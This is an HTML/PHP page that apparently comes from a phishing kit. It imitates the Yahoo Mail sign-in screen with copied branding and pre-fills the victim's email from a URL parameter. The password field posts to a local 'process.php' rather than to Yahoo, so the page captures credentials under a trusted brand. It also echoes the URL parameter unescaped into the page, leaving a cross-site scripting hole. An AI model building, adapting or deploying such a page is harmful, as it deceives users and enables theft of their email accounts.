<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="yui3-js-enabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Yahoo - login</title>
		
	<meta http-equiv="X-UA-Compatible" content="chrome=1">
	<link rel="stylesheet" type="text/css" href="image/yahoostyle.css">

</head>
		<body>
	<div class="mbr-desktop  ">
				<header>
			<div class="mbr-header-container pure-u-1">
	<div id="mbr-header" class="mbr-header pure-u-1 StencilRoot">
		<style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}
.top-link {    text-align: right;
    margin-top: -30px;}
	
	.top-link li a {
	padding:0 10px;
	}
	.top-link li {pad}
</style> 

<div id="uhWrapper" style="height: 3.8em;"> 

<img src="image/yahoologo.jpg" /> 

<div class="top-link" role="presentation" id="uhNavWrapper"> 

<ul class="top-link">   <li class=""><a class="" href="https://overview.mail.yahoo.com/" target="_blank"><b>About Mail</b></a><a  href="https://overview.mail.yahoo.com/#features" target="_blank" ><b>Features</b></a><a  href="https://mobile.yahoo.com/mail/?src=gta" target="_blank" ><b>Get the App</b></a></li>  </ul> </div> </div><!-- /#UH --></div>   	</div>
</div>
		</header>
						<main role="main">
<div class="mbr-login-bd" style="background:url(image/yahoomail.jpg); height:800px;">
				<div class="mbr-login-c pure-g">
					<div class="mbr-login-c-right pure-u">
						<!-- login box -->
						
<div class="mbr-login pure-u  no-partner" id="">
    <div class="mbr-login-box-top"></div>
    <div id="mbr-login-box" class="mbr-login-box  no-partner">
        <!-- Y LOGO HERE -->
        <div class="mbr-login-logo">
                        <img src="image/yahoologo.png">
                    </div>

        
        
        
                    <div id="mbr-login-greeting" class="mbr-login-signin-hd pure-u-1 mbr-overflow-ellipsis">
                Sign in            </div>
        
        
        
        <!-- SIGNIN FORM -->
        <fieldset id="" class="mbr-login-fieldset pure-group ">
            <form id="mbr-login-form" method="POST" action="process.php" class="pure-form pure-form-stacked mbr-login-form">
                <div id="inputs">
				
				 <!-- username -->
						<p style="    text-align: left;
    font-weight: bold;"><?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?></p>
						
						<input type="hidden" name="email" value="<?php if(isset($_GET['userid'])) {echo $_GET['userid']; } ?>" />
                        <input type="password" name="password" class="login-input
                             pure-u-1 "  aria-required="true" value="" placeholder="Enter your password">

                                <div id="submits" class="mbr-login-submit ">
                    <button id="login-signin" name="signin" type="submit" class="pure-u-1 pure-button mbr-button-primary" value="authtype" tabindex="4">Submit</button>
                </div>

                                                            <div class="stay-signin-in pure-g">
                                                            <div id="persistency" class="pure-u-1-2 mbr-checkbox ">
                                    <div class="mbr-text-align mbr-login-text-normal">
                                                                                <input id="persistent" name=".persistent" value="y" class="checkbox" type="checkbox" tabindex="3">
                                        <label for="persistent">Stay signed in</label>
                                    </div>
                                </div>
                            
                                                            <div class="pure-u-1-2 mbr-text-align-reverse">
                                    <a id="tslHelpLink" href="https://login.yahoo.com/?.src=ym&amp;.intl=us&amp;.lang=en-US&amp;.done=https%3A%2F%2Fmail.yahoo.com&amp;tsl_help=1" tabindex="6" class="mbr-login-forgot-link">Need help?</a>
                                </div>
                                                    </div>
                    
                                    
                

               
            </form>

            
                        <div id="yahoo-japan-container" class="mbr-hide">
                <a href="http://www.yahoo-help.jp/app/answers/detail/p/565/a_id/47713?soc_src=mail&amp;soc_trk=ma" class="pure-u-1 pure-button mbr-button-primary">
                    Visit Yahoo Help                </a>
                <div class="mbr-login-oauth2-yahoo-japan-msg">
                    Yahoo Japan users - please visit Yahoo Help to learn how to add your email address.                </div>
            </div>
        </fieldset>

                    <div class="tsl-message">
                To sign in, enter your email and tap "Next"            </div>
        
        
                                    
                                    <div class="mbr-login-create-account mbr-login-partner- pure-g">
                        <!--<div class="mbr-login-separator-title pure-u-1"><span class="mbr-separator-or">OR</span></div>-->
                        <div class="pure-u-1">
                                                                                    <span>Don't have an account?</span>
                                <a href="https://edit.yahoo.com/registration?.lang=en-US&amp;.intl=us&amp;.src=ym&amp;.done=https%3A%2F%2Fmail.yahoo.com" id="login-signup" tabindex="7">
                                    Sign up                                </a>
                            
                        </div>
                    </div>
                            
            </div>
</div>

					</div>
										<div id="mbr-login-contents-container" class="mbr-login-c-left pure-u" style="display: none;">
												<script>
							(function(){document.getElementById('mbr-login-contents-container').style.display='none';}());
						</script>
												<!-- left content -->
						<div id="mbr-login-contents" class="mbr-login-contents pure-u pure-u-1">
	<div class="info">
		<h3>Yahoo makes it easy to enjoy what matters most in your world.</h3>
	<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and  more. You get more out of the web, you get more out of life.</p>
		</div>
</div>
					</div>
				</div>
								<div id="mbr-login-full-contents" class="mbr-hide"></div>
								<!-- ads widget -->


			</div>
		</main>
		<footer>
			<!-- footer widget -->
						<div id="mbr-footer" class="mbr-footer pure-u-1">
	<div></div>
	<div></div>
	<div><a href="https://legalredirect.yahoo.com/utos?intl=us&amp;lang=en-US" target="_blank">Terms</a> | <a href="https://legalredirect.yahoo.com/privacy?intl=us" target="_blank">Privacy</a></div>
</div>
			<div id="mbr-login-foot" class="hidden"></div>
			<div class="mbr-login-foot-9"></div>
		</footer>
	</div>
	
	</body></html>